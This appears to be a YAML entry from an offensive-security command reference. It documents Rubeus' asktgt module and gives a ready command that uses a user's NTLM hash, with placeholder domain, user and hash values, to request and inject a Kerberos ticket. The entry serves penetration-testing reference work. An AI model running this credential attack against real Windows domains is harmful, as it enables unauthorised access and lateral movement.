---
description: |
  Rubeus' `asktgt` module uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.

  Command Reference:

  	Domain: test.local

  	Username: john

  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7

command: |
  Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
items:
  - Hash
  - Username
services:
  - Kerberos
OS:
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/GhostPack/Rubeus
  - https://github.com/GhostPack/Rubeus#asktgt
---
